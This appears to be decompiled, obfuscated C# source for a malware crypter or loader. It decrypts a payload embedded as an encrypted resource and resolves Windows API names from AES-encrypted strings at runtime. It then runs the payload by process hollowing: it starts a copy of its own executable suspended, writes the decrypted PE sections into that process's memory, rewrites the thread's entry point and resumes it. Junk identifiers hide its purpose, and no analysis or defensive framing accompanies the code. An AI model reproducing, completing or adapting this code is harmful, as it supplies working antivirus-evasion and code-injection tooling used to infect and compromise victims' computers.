using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ns1;

internal class Class3
{
	public static class Class4
	{
		public delegate double Delegate0(int nhffskdsfkdfdhdafrffddhfscffdf, byte hkgfsfdffdhfhddrfahhddsshcf, short chfdgeffhfkdafsfhddhdshdghf);

		public delegate double Delegate1(int hfsdkfdhgfshseffdfaffhfdch, byte fhhfgsffrffdkdffcdhhhfdasdfh, short fchfhfdgfadfdfrsfsshdkfffgh);

		public delegate double Delegate2(int hjfdffhfgadsffhrddfffskhj, byte fsfhrgdddffhdffffkhsjd, short fjshdfcffddshdffgfedfkfghj);

		public delegate void Delegate3();

		public delegate double Delegate4(int sddddffsfheghddjffffffgjhskdgsfacsafp, byte sfhjffkfhgfhjsrfhhddfhffadsfsfhsscfgdb, short ddfrhjfsffhgdffafcfdssfkfhgj);

		public delegate double Delegate5(int ffchkffgahfhfsrddsfsfj, byte jffadsfcfhdggfsdehfsgkffj, short jcfssafdghhfffrfddsdgkfff);

		public delegate double Delegate6(int ffchkfhrffdfdhafgsssffj, byte jffafffffdrdgfhcsdsgkffj, short jcfhdsfrfgfdsadfsdgkffff);

		public delegate bool Delegate7(IntPtr gdddfdsfdhfssfdgh, int[] fhfssddssdfhfddfhhs);

		public delegate bool Delegate8(IntPtr hsfddsd, int[] fsdfdsh);

		public delegate bool Delegate9(IntPtr shsdsffdsd, int sdfsdfsfh, int sdhffsdssf, int sshddsfgfs, ref int afsdgfsdshs);

		public delegate int Delegate10(IntPtr gsfsfdsd, IntPtr gssdaffadss, uint gsfashdsfs, uint gfssadfsdg, uint gasdsfdfshsg);

		public delegate bool Delegate11(IntPtr gdsdfafag, int hssddfdafs, byte[] adsfdsfsdds, int jdddfsdsf, out int gdfgfsssdfh);

		public delegate bool Delegate12(IntPtr jfsdsafdfhg, int[] jffddddsgfdgs);

		public delegate bool Delegate13(IntPtr jsfsddfdf, int[] jdffaf);

		public delegate uint Delegate14(IntPtr gdfddsfddj);

		public delegate bool Delegate15(IntPtr kfdssfdfsgfh, string fssjfsffdfg, string sjfadsfff, IntPtr fdfhfsfsfs, IntPtr jsffsfdssd, bool jdsdffffssk, uint wssffssdv, IntPtr gsffffsds, string gffssfddsx, ref Struct1 startupInfo, ref Struct0 mFe, int da = 231);

		public delegate bool Delegate16(IntPtr jdfhfdfdffdffssdkfj, int[] hdfffdfhffsassdkfsh);

		public delegate uint Delegate17(IntPtr hdffhdfsdhdffdfkdf);

		public delegate bool Delegate18(IntPtr affdssdfffhhfhh, string sdfffdsshfffdhf, string hffdsffdfshfsdhs, IntPtr hhhgfdffffdfsfh, IntPtr sfdfsffhfffdhs, bool fddsffhss, uint ffdhdfff, IntPtr hhfdhsdffsf, string jhffsdffdfdh, ref Struct1 startupInfo, ref Struct0 mFe);

		public struct Struct0
		{
			public readonly IntPtr intptr_0;

			public readonly IntPtr intptr_1;

			public readonly uint uint_0;

			private readonly uint uint_1;
		}

		public struct Struct1
		{
			public uint uint_0;

			private readonly string string_0;

			private readonly string string_1;

			private readonly string string_2;

			private readonly byte[] byte_0;

			private readonly IntPtr intptr_0;

			private readonly IntPtr intptr_1;

			private readonly IntPtr intptr_2;

			private readonly IntPtr intptr_3;
		}

		[StructLayout(LayoutKind.Sequential, Size = 1)]
		public struct Struct2
		{
		}

		[StructLayout(LayoutKind.Sequential, Size = 1)]
		public struct Struct3
		{
		}

		[StructLayout(LayoutKind.Sequential, Size = 1)]
		public struct Struct4
		{
		}

		private static Delegate7 delegate7_0 = smethod_0<Delegate7>(Class3.smethod_3("fBarPbdOUwpjp0Sf9W5dsEfXvXnVK9EExln8tPxBdkw=", "FrFldrcnpngkp"), Class3.smethod_3("RY3g3jynk5LMLPUcgiwQVyeqIg85n9CI4dzXm9NZREMi0nqlwgToWx2LT5+RImUt", "FrFldrcnpngkp"));

		private static Delegate8 delegate8_0 = smethod_0<Delegate8>(Class3.smethod_3("fBarPbdOUwpjp0Sf9W5dsEfXvXnVK9EExln8tPxBdkw=", "FrFldrcnpngkp"), Class3.smethod_3("bShF1+Hg08qMNt8hy4Qfk1p2wjFE7S+FrS/kr44bvVHpFWwO3Z7IlO3iT2CmJARd", "FrFldrcnpngkp"));

		private static Delegate9 delegate9_0 = smethod_0<Delegate9>(Class3.smethod_3("fBarPbdOUwpjp0Sf9W5dsEfXvXnVK9EExln8tPxBdkw=", "FrFldrcnpngkp"), Class3.smethod_3("Y14QJB0VXLUGOcMtheBHVDMTFEIiP+Nf0IlGjdPze4zjiydwCiMqae+8QzDR6wtL", "FrFldrcnpngkp"));

		private static Delegate10 delegate10_0 = smethod_0<Delegate10>(Class3.smethod_3("fBarPbdOUwpjp0Sf9W5dsEfXvXnVK9EExln8tPxBdkw=", "FrFldrcnpngkp"), Class3.smethod_3("Gzc9W5n+OUwk8ShH144nGO0QAaehtSDcjNMXXEJVF/E=", "FrFldrcnpngkp"));

		private static Delegate11 delegate11_0 = smethod_0<Delegate11>(Class3.smethod_3("fBarPbdOUwpjp0Sf9W5dsEfXvXnVK9EExln8tPxBdkw=", "FrFldrcnpngkp"), Class3.smethod_3("C7lpGs4ioxgkMaP8WHZV+zPl6aKVqkdJTt8OdjoJzS83kcc8Lp2J7jfHfXuIezpU", "FrFldrcnpngkp"));

		private static Delegate12 delegate12_0 = smethod_0<Delegate12>(Class3.smethod_3("fBarPbdOUwpjp0Sf9W5dsEfXvXnVK9EExln8tPxBdkw=", "FrFldrcnpngkp"), Class3.smethod_3("KC4xDsNePbdNnUeAxDcFY0WCqjLuyCalwFjJy2tZKLvToIwNTLQpwSllJElCxZo7", "FrFldrcnpngkp"));

		private static Delegate13 delegate13_0 = smethod_0<Delegate13>(Class3.smethod_3("fBarPbdOUwpjp0Sf9W5dsEfXvXnVK9EExln8tPxBdkw=", "FrFldrcnpngkp"), Class3.smethod_3("dXjdxcQ476NvzhTKv/locgRreY9tU6Th8MI+kkw2FeO0ywbhZSmCyYd6mLPHZIWX", "FrFldrcnpngkp"));

		private static Delegate14 delegate14_0 = smethod_0<Delegate14>(Class3.smethod_3("fBarPbdOUwpjp0Sf9W5dsEfXvXnVK9EExln8tPxBdkw=", "FrFldrcnpngkp"), Class3.smethod_3("32zt2j6s4pbhHTvHM2Ias7k60nNzdHbOYhThlhgMqKI=", "FrFldrcnpngkp"));

		private static Delegate15 delegate15_0 = smethod_0<Delegate15>(Class3.smethod_3("B3vcZ6p0kKRGFwfhaGyCBMxLvLDM6PSIg9Y95Vgst9c=", "FrFldrcnpngkp"), Class3.smethod_3("UsOVOTdsw5aFq4ZtzaMVL2qWeUNh4+DxD09tqo5XOAehPiQ/+sC27zo99RVi2JYN", "FrFldrcnpngkp"));

		private static Delegate16 delegate16_0 = smethod_0<Delegate16>(Class3.smethod_3("fBarPbdOUwpjp0Sf9W5dsEfXvXnVK9EExln8tPxBdkw=", "FrFldrcnpngkp"), Class3.smethod_3("dXjdxcQ476NvzhTKv/locgRreY9tU6Th8MI+kkw2FeO0ywbhZSmCyYd6mLPHZIWX", "FrFldrcnpngkp"));

		private static Delegate17 delegate17_0 = smethod_0<Delegate17>(Class3.smethod_3("fBarPbdOUwpjp0Sf9W5dsEfXvXnVK9EExln8tPxBdkw=", "FrFldrcnpngkp"), Class3.smethod_3("32zt2j6s4pbhHTvHM2Ias7k60nNzdHbOYhThlhgMqKI=", "FrFldrcnpngkp"));

		private static Delegate18 delegate18_0 = smethod_0<Delegate18>(Class3.smethod_3("B3vcZ6p0kKRGFwfhaGyCBMxLvLDM6PSIg9Y95Vgst9c=", "FrFldrcnpngkp"), Class3.smethod_3("UsOVOTdsw5aFq4ZtzaMVL2qWeUNh4+DxD09tqo5XOAehPiQ/+sC27zo99RVi2JYN", "FrFldrcnpngkp"));

		public static T smethod_0<T>(string string_0, string string_1)
		{
			AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(new AssemblyName(Class3.smethod_3("FawqgEK+yQI1vETfhg9B/n303T96QhGO+nqBM0OWc0r7yE/YCeo4+9onSDbMxOqR", "FrFldrcnpngkp")), AssemblyBuilderAccess.Run);
			ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule(Class3.smethod_3("FawqgEK+yQI1vETfhg9B/sgh3PcpRUwBaykR8vr06nNykUbBLYTRcp59xshUkfy9", "FrFldrcnpngkp"));
			TypeBuilder typeBuilder = moduleBuilder.DefineType("DynamicDllInvokeType", TypeAttributes.Public | TypeAttributes.UnicodeClass);
			MethodInfo method = typeof(T).GetMethod(Class3.smethod_3("A2JNdnMMVWiCZJn3p3iHlA==", "FrFldrcnpngkp"));
			Type[] parameterTypes = (from parameterInfo_0 in method.GetParameters()
				select parameterInfo_0.ParameterType).ToArray();
			MethodBuilder methodBuilder = typeBuilder.DefinePInvokeMethod(string_1, string_0, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, method.ReturnType, parameterTypes, CallingConvention.Winapi, CharSet.Ansi);
			methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
			Type type = typeBuilder.CreateType();
			MethodInfo method2 = type.GetMethod(string_1);
			return (T)(object)Delegate.CreateDelegate(typeof(T), method2, throwOnBindFailure: true);
		}

		public static bool smethod_1(byte[] byte_0, string string_0, string string_1)
		{
			int num = 1;
			while (true)
			{
				if (num <= 4)
				{
					if (smethod_2(byte_0, string_0, string_1))
					{
						break;
					}
					num++;
					continue;
				}
				return false;
			}
			return true;
		}

		public static bool smethod_2(byte[] byte_0, string string_0, string string_1)
		{
			bool flag = false;
			int afsdgfsdshs = 0;
			string text = "\"" + string_0 + "\"";
			Struct1 startupInfo = default(Struct1);
			Struct0 mFe = default(Struct0);
			startupInfo.uint_0 = Convert.ToUInt32(Marshal.SizeOf(typeof(Struct1)));
			try
			{
				if (!string.IsNullOrEmpty(string_1))
				{
					text = text + " " + string_1;
				}
				if (!delegate15_0(IntPtr.Zero, string_0, text, IntPtr.Zero, IntPtr.Zero, jdsdffffssk: false, 4u, IntPtr.Zero, null, ref startupInfo, ref mFe))
				{
					throw new Exception();
				}
				int num = BitConverter.ToInt32(byte_0, 60);
				int num2 = BitConverter.ToInt32(byte_0, num + 52);
				int[] array = new int[179];
				array[0] = 65538;
				if (IntPtr.Size != 4)
				{
					delegate7_0(mFe.intptr_1, array);
				}
				else
				{
					delegate8_0(mFe.intptr_1, array);
				}
				int num3 = array[41];
				delegate9_0(mFe.intptr_0, num3 + 8, 0, 4, ref afsdgfsdshs);
				int gsfashdsfs = BitConverter.ToInt32(byte_0, num + 80);
				int jdddfsdsf = BitConverter.ToInt32(byte_0, num + 84);
				bool flag2 = false;
				int num4 = delegate10_0(mFe.intptr_0, (IntPtr)num2, (uint)gsfashdsfs, 12288u, 64u);
				if (!flag && num4 == 0)
				{
					flag2 = true;
					num4 = delegate10_0(mFe.intptr_0, (IntPtr)0, (uint)gsfashdsfs, 12288u, 64u);
				}
				if (num4 == 0)
				{
					throw new Exception();
				}
				delegate11_0(mFe.intptr_0, num4, byte_0, jdddfsdsf, out afsdgfsdshs);
				int num5 = num + 248;
				short num6 = BitConverter.ToInt16(byte_0, num + 6);
				int num7 = 0;
				do
				{
					int num8 = BitConverter.ToInt32(byte_0, num5 + 12);
					int num9 = BitConverter.ToInt32(byte_0, num5 + 16);
					int srcOffset = BitConverter.ToInt32(byte_0, num5 + 20);
					if (num9 != 0)
					{
						byte[] array2 = new byte[num9];
						Buffer.BlockCopy(byte_0, srcOffset, array2, 0, array2.Length);
						delegate11_0(mFe.intptr_0, num4 + num8, array2, array2.Length, out afsdgfsdshs);
					}
					num5 += 40;
					num7++;
				}
				while (num7 <= num6 - 1);
				byte[] bytes = BitConverter.GetBytes(num4);
				delegate11_0(mFe.intptr_0, num3 + 8, bytes, 4, out afsdgfsdshs);
				int num10 = BitConverter.ToInt32(byte_0, num + 40);
				if (flag2)
				{
					num4 = num2;
				}
				array[44] = num4 + num10;
				if (IntPtr.Size != 4)
				{
					delegate12_0(mFe.intptr_1, array);
				}
				else
				{
					delegate13_0(mFe.intptr_1, array);
				}
				delegate14_0(mFe.intptr_1);
				return true;
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
				return false;
			}
		}

		[CompilerGenerated]
		private static Type smethod_3<T>(ParameterInfo parameterInfo_0)
		{
			return parameterInfo_0.ParameterType;
		}
	}

	private const int int_0 = 256;

	private const int int_1 = 1000;

	private string string_0 = Application.get_ExecutablePath();

	private static void Main()
	{
		Class3 @class = new Class3();
		@class.method_1();
	}

	private static byte[] smethod_0()
	{
		return new byte[32];
	}

	public void method_0()
	{
	}

	public static bool smethod_1()
	{
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead("http://google.com"))
			{
				return true;
			}
		}
		catch
		{
			return false;
		}
	}

	public void method_1()
	{
		byte[] byte_ = smethod_2("FrFldrcnpngkp", "FrFldrcnpngkp");
		method_0();
		byte_ = method_2(byte_, "FrFldrcnpngkp");
		Class4.smethod_1(byte_, string_0, null);
		Thread.Sleep(10000000);
	}

	public static byte[] smethod_2(string string_1, string string_2)
	{
		ResourceManager resourceManager = new ResourceManager(string_2, Assembly.GetExecutingAssembly());
		byte[] array = null;
		return (byte[])resourceManager.GetObject(string_1);
	}

	public static string smethod_3(string string_1, string string_2)
	{
		string_1 = string_1.Replace(" ", "+");
		byte[] array = Convert.FromBase64String(string_1);
		using Aes aes = Aes.Create();
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(string_2, new byte[11]
		{
			73, 118, 97, 110, 32, 77, 118, 101, 100, 101,
			118
		});
		aes.Key = rfc2898DeriveBytes.GetBytes(32);
		aes.IV = rfc2898DeriveBytes.GetBytes(16);
		using MemoryStream memoryStream = new MemoryStream();
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
		}
		string_1 = Encoding.Unicode.GetString(memoryStream.ToArray());
		return string_1;
	}

	public byte[] method_2(byte[] byte_0, string string_1)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(string_1));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		return cryptoTransform.TransformFinalBlock(byte_0, 0, byte_0.Length);
	}
}
